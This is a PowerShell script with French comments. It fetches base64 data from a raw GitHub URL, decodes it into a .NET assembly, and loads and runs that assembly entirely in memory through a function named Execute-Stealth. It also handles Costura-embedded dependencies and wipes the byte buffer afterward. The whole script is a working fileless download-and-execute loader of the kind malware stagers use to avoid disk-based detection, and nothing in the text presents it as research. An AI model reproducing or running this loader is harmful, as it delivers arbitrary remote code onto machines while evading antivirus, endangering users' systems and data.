[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

function Download-Base64 {
    param (
        [string]$url
    )
    $base64 = Invoke-RestMethod -Uri $url
    return $base64
}

function Decode-Base64 {
    param (
        [string]$base64
    )
    $bytes = [Convert]::FromBase64String($base64)
    return $bytes
}

function Execute-InMemory {
    param (
        [byte[]]$bytes
    )

    # Charger l'assembly d'abord
    $assembly = [System.Reflection.Assembly]::Load($bytes)
    
    # Essayer de declencher l'initialisation de Costura manuellement
    try {
        $costuraType = $assembly.GetType("Costura.AssemblyLoader")
        if ($costuraType -ne $null) {
            $attachMethod = $costuraType.GetMethod("Attach", [System.Reflection.BindingFlags]::Public -bor [System.Reflection.BindingFlags]::Static)
            if ($attachMethod -ne $null) {
                $attachMethod.Invoke($null, $null)
            }
        }
    } catch {
        # Si Costura ne s'initialise pas automatiquement, utiliser notre handler
    }
    
    # Handler de secours pour Costura (au cas ou Attach() ne fonctionne pas)
    $script:mainAssembly = $assembly
    $onAssemblyResolve = {
        param($sender, $e)
        $assemblyName = $e.Name.Split(',')[0].ToLowerInvariant()
        
        if ($script:mainAssembly -ne $null) {
            $resourceNames = $script:mainAssembly.GetManifestResourceNames()
            # Chercher toutes les variantes possibles
            $resourceName = $resourceNames | Where-Object { 
                $_ -like "costura.$assemblyName.dll.compressed" -or 
                $_ -like "costura.$assemblyName.dll" -or
                $_ -like "costura.$($assemblyName.Replace('.', '_'))*.dll.compressed" -or
                $_ -like "costura.$($assemblyName.Replace('.', '_'))*.dll"
            } | Select-Object -First 1
            
            if ($resourceName) {
                try {
                    $stream = $script:mainAssembly.GetManifestResourceStream($resourceName)
                    if ($stream -ne $null) {
                        if ($resourceName.EndsWith(".compressed")) {
                            $deflateStream = New-Object System.IO.Compression.DeflateStream($stream, [System.IO.Compression.CompressionMode]::Decompress)
                            $memoryStream = New-Object System.IO.MemoryStream
                            $deflateStream.CopyTo($memoryStream)
                            $assemblyBytes = $memoryStream.ToArray()
                            $deflateStream.Close()
                            $memoryStream.Close()
                        } else {
                            $assemblyBytes = New-Object byte[] $stream.Length
                            $stream.Read($assemblyBytes, 0, $assemblyBytes.Length) | Out-Null
                        }
                        $stream.Close()
                        return [System.Reflection.Assembly]::Load($assemblyBytes)
                    }
                } catch {}
            }
        }
        return $null
    }
    
    [System.AppDomain]::CurrentDomain.add_AssemblyResolve($onAssemblyResolve)

    $entryPoint = $assembly.EntryPoint
    if ($entryPoint -ne $null) {
        $entryPoint.Invoke($null, @())
    }
}

function Execute-Stealth {
    param (
        [string]$url
    )

    $base64 = Download-Base64 -url $url
    $bytes = Decode-Base64 -base64 $base64
    Execute-InMemory -bytes $bytes

    [Array]::Clear($bytes, 0, $bytes.Length)
}

$url = "https://raw.githubusercontent.com/thegoatofapi/mth/refs/heads/main/file.txt"

Execute-Stealth -url $url
